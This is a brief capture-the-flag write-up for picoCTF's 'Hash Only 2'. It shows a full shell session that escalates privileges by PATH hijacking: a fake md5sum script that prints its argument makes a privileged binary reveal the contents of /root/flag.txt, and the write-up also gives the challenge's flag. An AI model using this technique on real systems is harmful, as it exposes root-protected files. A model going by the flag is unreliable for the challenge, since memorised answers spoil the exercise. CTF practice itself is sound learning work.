# Hash Only 2

## Description

Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!
Additional details will be available after launching your challenge instance.


## Answer

This one is super similar to hash only 1, this is how i did it:


``` 
ctf-player@pico-chall$ bash
ctf-player@challenge:~$ ls
ctf-player@challenge:~$ echo '#!/bin/bash' > md5sum
ctf-player@challenge:~$ echo 'cat "$1"' >> md5sum
ctf-player@challenge:~$ chmod +x md5sum
ctf-player@challenge:~$ pwd
/home/ctf-player
ctf-player@challenge:~$ export PATH=/home/ctf-player:$PATH
ctf-player@challenge:~$ flaghasher 
Computing the MD5 hash of /root/flag.txt.... 

picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_6e3b0209}ctf-player@challenge:~$ Connection to rescued-float.picoctf.net closed by remote host.
Connection to rescued-float.picoctf.net closed.
```
